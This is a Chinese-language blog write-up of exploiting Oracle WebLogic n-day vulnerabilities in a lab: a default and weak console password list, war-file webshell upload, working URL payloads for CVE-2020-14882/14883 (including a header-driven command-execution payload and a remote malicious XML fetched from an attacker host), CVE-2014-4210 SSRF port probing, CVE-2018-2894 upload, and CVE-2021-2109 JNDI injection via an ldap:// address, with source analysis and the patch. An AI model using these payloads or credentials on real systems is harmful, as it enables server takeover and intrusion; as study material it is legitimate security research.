# Weblogic学习(2)


&lt;!--more--&gt;

## 前言

相对于前面的反序列化洞，以下几个洞比较简单，就不多加分析了，主要看下怎么打

## 弱口令 getshell

### 弱口令

访问 WebLogic `/console` 接口，可能存在的弱口令如下

|    账户     |    密码     |
| :---------: | :---------: |
|   system    |  password   |
|  weblogic   |  weblogic   |
|    guest    |    guest    |
| portaladmin | portaladmin |
|    admin    |  security   |
|     joe     |  password   |
|    mary     |  password   |
|   system    |  security   |
|  wlcsystem  |  wlcsystem  |
|  wlcsystem  | sipisystem  |

一些弱口令密码

```
weblogic1  
weblogic12  
weblogic123  
weblogic@123  
webl0gic  
weblogic#  
weblogic@
```

这里错误密码5次之后就会自动锁定，用 qax 搭建的这个环境的账户密码为：weblogic、qaxateam01

### 文件上传

之后就在左边域结构处的部署那进行文件上传，点击安装后上传文件，随便弄个 jsp 木马，压缩成 zip 后改后缀为 war

![image-20250505155237754](https://bu.dusays.com/2025/05/11/682043ec67314.png)

将文件传在上面那处

![image-20250505155306999](https://bu.dusays.com/2025/05/11/682043ec733e3.png)

然后一直点下一步，最后点完成，之后启动就能 getshell 了

![image-20250505155551392](https://bu.dusays.com/2025/05/11/682043ec68a4e.png)

![image-20250505155735480](https://bu.dusays.com/2025/05/11/682043ec62288.png)

## CVE-2020-14882/CVE-2020-14883 未授权 RCE

这里 rce 是在未授权的基础上进后台 rce 的，简单地介绍下两个漏洞

- CVE-2020-14883：允许未授权的用户通过目录穿越结合双重 URL 编码的方式来绕过管理控制台的权限验证访问后台。
- CVE-2020-14882：允许后台任意用户通过 HTTP 协议执行任意命令。

### 影响版本

Oracle WebLogic Server 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0 and 14.1.1.0.0

### CVE-2020-14883

直接访问 console 会跳转到 /console/login/LoginForm.jsp 进行登录，这里可以利用双重 url 编码&#43;目录穿越进 console 后台，payload

```
/console/css/%252e%252e%252fconsole.portal
```

进去后很明显和之前弱口令进去的后台不一样，没有部署，无法上传恶意 war 包来拿 shell，接下来可以结合 CVE-2020-14882 来 getshell

![image-20250505172412953](https://bu.dusays.com/2025/05/11/682043ec9f880.png)

### CVE-2020-14882

在上述未授权进入的后台是低权限的情况下，可以利用 CVE-2020-14883 来打，有两种打法，一是用 `com.tangosol.coherence.mvel2.sh.ShellSession` 来直接 rce，二是用 `com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext` 加载恶意 xml 文件来 rce

#### 方法一

利用的是 `com.tangosol.coherence.mvel2.sh.ShellSession` 类

此利用方法只能在 Weblogic 12.2.1 及以上版本利用，因为低版本并不存在 `com.tangosol.coherence.mvel2.sh.ShellSession` 类

payload1

```
/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&amp;_pageLabel=HomePage1&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27touch /tmp/pocIsok%27);%22);
```

payload2

```
/console/css/%252e%252e%252fconsole.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession(%27weblogic.work.ExecuteThread%20currentThread%20=%20(weblogic.work.ExecuteThread)Thread.currentThread();%20weblogic.work.WorkAdapter%20adapter%20=%20currentThread.getCurrentWork();%20java.lang.reflect.Field%20field%20=%20adapter.getClass().getDeclaredField(%22connectionHandler%22);field.setAccessible(true);Object%20obj%20=%20field.get(adapter);weblogic.servlet.internal.ServletRequestImpl%20req%20=%20(weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod(%22getServletRequest%22).invoke(obj);%20String%20cmd%20=%20req.getHeader(%22cmd%22);String[]%20cmds%20=%20System.getProperty(%22os.name%22).toLowerCase().contains(%22window%22)%20?%20new%20String[]{%22cmd.exe%22,%20%22/c%22,%20cmd}%20:%20new%20String[]{%22/bin/sh%22,%20%22-c%22,%20cmd};if(cmd%20!=%20null%20){%20String%20result%20=%20new%20java.util.Scanner(new%20java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter(%22\\A%22).next();%20weblogic.servlet.internal.ServletResponseImpl%20res%20=%20(weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod(%22getResponse%22).invoke(req);res.getServletOutputStream().writeStream(new%20weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();}%20currentThread.interrupt();
```

在 http 头添加 cmd 参数及其值即可 rce

![image-20250505174455535](https://bu.dusays.com/2025/05/11/682043ed993c5.png)

#### 方法二

利用的是 `com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext`

从这个函数都可以看出来，加载恶意xml来rce，此利用方法无版本限制，但是需要出网，公网上放1.xml

```
&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; ?&gt;
&lt;beans xmlns=&#34;http://www.springframework.org/schema/beans&#34;
   xmlns:xsi=&#34;http://www.w3.org/2001/XMLSchema-instance&#34;
   xsi:schemaLocation=&#34;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&#34;&gt;
    &lt;bean id=&#34;pb&#34; class=&#34;java.lang.ProcessBuilder&#34; init-method=&#34;start&#34;&gt;
        &lt;constructor-arg&gt;
          &lt;list&gt;
            &lt;value&gt;bash&lt;/value&gt;
            &lt;value&gt;-c&lt;/value&gt;
            &lt;value&gt;&lt;![CDATA[touch /tmp/xml_test]]&gt;&lt;/value&gt;
          &lt;/list&gt;
        &lt;/constructor-arg&gt;
    &lt;/bean&gt;
&lt;/beans&gt;
```

然后让其加载

```
/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(&#34;http://ip:port/1.xml&#34;)
```

![image-20250505175100638](https://bu.dusays.com/2025/05/11/682043ec363d2.png)

## CVE-2014-4210 SSRF

### 影响版本

Oracle WebLogic Server 10.0.2, 10.3.6

### 漏洞复现

WebLogic 的 `SearchPublicReqistries.jsp` 接口存在 SSRF 漏洞，如果服务端或内网存在 Redis 未授权访问漏洞等则可以进一步打漏洞组合拳进行攻击利用。

`SearchPublicReqistries.jsp` 在 `/wlserver/server/lib/uddiexplorer.war` 中

![image-20250505183040716](https://bu.dusays.com/2025/05/11/6820441427db3.png)

`operator` 参数就是传进去的 url，然后 `search.getResponse()` 就会向这个 url 发送请求，而且这个服务没有任何鉴权，可以直接访问，用 payload 探测下 7001 端口

```
/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business&#43;location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:7001
```

回显为

```
An error has occurred
weblogic.uddi.client.structures.exception.XML_SoapException: The server at http://127.0.0.1:7001 returned a 404 error code (Not Found). Please ensure that your URL is correct, and the web service has deployed without error. 
```

当探测 7000 端口时回显

```
An error has occurred
weblogic.uddi.client.structures.exception.XML_SoapException: Tried all: &#39;1&#39; addresses, but could not connect over HTTP to server: &#39;127.0.0.1&#39;, port: &#39;7000&#39; 
```

可以看到 7001 端口只是没找到服务而 7000 端口都不能建立 http 连接，可以通过这个来探测端口

## CVE-2018-2894 任意文件上传

### 影响版本

Weblogic 10.3.6，12.1.3，12.2.1.2，12.2.1.3

### 漏洞复现

weblogic如果开启了web服务测试页（默认不开启），则分别会在/ws_utc/begin.do以及/ws_utc/config.do这两个页面存在任意上传getshell漏洞

由于该设置默认不开启，所以此漏洞有一定的局限性

![image-20250505225259738](https://bu.dusays.com/2025/05/11/682043ec95ce2.png)

“高级” 中开启 “启用 Web 服务测试页”，但我这没有这个选项，赛博复现下，挺简单的反正

访问漏洞页面http://your-ip:7001/ws_utc/config.do（需要手动设置一下环境设置Work Home Dir为，/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css）

![image-20250505225442049](https://bu.dusays.com/2025/05/11/682043ec57ca4.png)

点击安全 -&gt; 添加，名字和密码可以随意设置，传个 jsp 马

![image-20250505225448449](https://bu.dusays.com/2025/05/11/682043ec85164.png)

文件上传的路径为http://your-ip:7001/ws_utc/css/config/keystore/[时间戳]_[文件名]，这里的时间戳获取方式有两种，其一为bp抓包查看，其二利用浏览器自带的检查获取，如下所示：

![image-20250505225504857](https://bu.dusays.com/2025/05/11/682043ec86f0b.png)

然后 rce 即可

### 小结

都挺简单的，感觉限制比较多，不是需要版本低就是要进后台或者开启某些特殊配置，nday是这样的，也算是对 weblogic 有个简单的了解

### 参考

https://drun1baby.top/2023/03/06/WebLogic-%E5%BC%B1%E5%8F%A3%E4%BB%A4-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-SSRF/

https://blog.csdn.net/weixin_51198941/article/details/134193310



## CVE-2021-2109 WebLogic JNDI 注入

### 环境搭建

参考T3反序列化的环境，需要多加一个 `\server\lib\consoleapp\webapp\WEB-INF\lib\console.jar` 到依赖中

```
docker run -d -p 7001:7001 -p 8453:8453 -p 5556:5556 --name weblogic1036jdk7u21 weblogic1036jdk7u21
```

### 漏洞分析

#### 利用前提

Oracle WebLogic Server 10.3.6.0.0、12.1.3.0.0、12.2.1.3.0、12.2.1.4.0、14.1.1.0.0

这里要进入到 /console/consolejndi.portal 路由里才能打

#### 漏洞分析

原理就是WebLogic 的 `/console/consolejndi.portal` 接口可以调用存在 JNDI 注入漏洞的 `com.bea.console.handles.JndiBindingHandle` 类，从而造成 RCE，所以要在进后台的前提下才能打

这里用到的工具为：https://github.com/welk1n/JNDI-Injection-Exploit

```
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &#34;touch /tmp/jndi_test&#34; -A 192.168.2.1
```

![image-20250506171207587](https://bu.dusays.com/2025/05/11/6820442bb6338.png)

payload为

```
/console/css/%252e%252e%252fconsolejndi.portal?_pageLabel=JNDIBindingPageGeneral&amp;_nfpb=true&amp;JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://192.168.2;1:1389/mezyww;AdminServer%22)
```

![image-20250506171326607](https://bu.dusays.com/2025/05/11/68204426d66e2.png)

这里就是 `;` 而不是 `.`

看到 `\server\lib\consoleapp\webapp` 下的 `consolejndi.portal` ，就是我们刚才 payload 中访问的路由

![image-20250506175245640](https://bu.dusays.com/2025/05/11/6820442a1d01d.png)

具体的处理逻辑在 `/PortalConfig/jndi/jndibinding.portlet`

![image-20250506180515325](https://bu.dusays.com/2025/05/11/6820442b45d28.png)

可以发现在 `com.bea.console.actions.jndi.JNDIBindingAction#execute` 中就是处理逻辑

![image-20250506205421771](https://bu.dusays.com/2025/05/11/6820443011a92.png)

先获取 jndi 上下文然后就直接 lookup 了，现在先看下怎么控制 serverMBean 了，而一直往上追溯其赋值，大概可以用下面这个赋值链表示

```
JndiBindingHandle bindingHandle = (JndiBindingHandle)this.getHandleContext(actionForm, request, &#34;JNDIBinding&#34;);
-&gt;
String serverName = bindingHandle.getServer();
-&gt;
ServerMBean serverMBean = domainMBean.lookupServer(serverName);
```

从 `domainMBean.lookupServer(serverName)` 开始分析，这里是动态代理调用，用的是 `weblogic.management.jmx.MBeanServerInvocationHandler#invoke`

![image-20250506211514032](https://bu.dusays.com/2025/05/11/68204430dc712.png)

这里 var2 就是要调用的方法 `weblogic.management.configuration.DomainMBean#lookupServer` ，var3 则是要传进去的参数，然后发现 var2 的实现类是 `weblogic.management.configuration.DomainMBeanImpl#lookupServer` 

```java
    public ServerMBean lookupServer(String var1) {
        Iterator var2 = Arrays.asList((Object[])this._Servers).iterator();

        ServerMBeanImpl var3;
        do {
            if (!var2.hasNext()) {
                return null;
            }

            var3 = (ServerMBeanImpl)var2.next();
        } while(!var3.getName().equals(var1));

        return var3;
    }
```

这里 `this._Servers` 是一组服务器对象，会依次取出其中的实例并判断其 getName 返回的值是否为我们传进去的 var1

我们肯定不能返回 null，所以我们必须要让传进去的 var1 等于其 getName 值，这里只有一个实例，其 getName 返回的值为 AdminServer

![image-20250506213012236](https://bu.dusays.com/2025/05/11/68204427191db.png)

因此我们传入的 var1 值为 AdminServer ，根据之前我们的赋值链可以发现 var1 就是 serverName，跟进下 getServer 方法会发现其值是可控的，会返回 getComponent 方法获得的数组中索引为 2 的值，这个方法待会分析

```
    public String getServer() {
        return this.getComponent(2);
    }
```

至此 `c != null` 已经可以满足，现在看看 jndi lookup 的地址怎么控制

![image-20250506213900415](https://bu.dusays.com/2025/05/11/6820442f28dc9.png)

跟进发现其两个 getter 方法都是调用的 ，而且都是用到 getComponent 方法返回的数组

![image-20250506214010067](https://bu.dusays.com/2025/05/11/68204428d074b.png)

最后跟进到 `com.bea.console.handles.HandleImpl#getComponents()` ，这个方法也很简单，就是用 `;` 来分隔数组中的每个组件

所以最后构造 payload 的时候就很清晰了，写三个组件，前两个是 jndi 的远程地址，最后一个为 AdminServer 就好了，用 `;` 分隔

#### 漏洞修复

加了个函数来判断传进 lookup 方法的值

![image-20250506215751500](https://bu.dusays.com/2025/05/11/6820442ab2c23.png)

只允许以 `java:` 开头的本地 JNDI 名称，远程的如 rmi，ldap 就不行了

### 小结

限制比较大感觉，要进后台，漏洞本身的利用思路还是非常有趣的

### 参考

https://drun1baby.top/2023/02/12/CVE-2021-2109-WebLogic-JNDI-%E6%B3%A8%E5%85%A5/

https://y4er.com/posts/weblogic-cve-2021-2109-jndi-rce/



## 总结

有总的利用脚本：https://github.com/zhzyker/exphub/tree/master/weblogic

利用相对于反序列化简单很多，但限制都比较大感觉，Weblogic 暂时到这，之后遇到其他利用手法再说


---

> 作者: 6s6  
> URL: http://localhost:1313/posts/0846c48/  

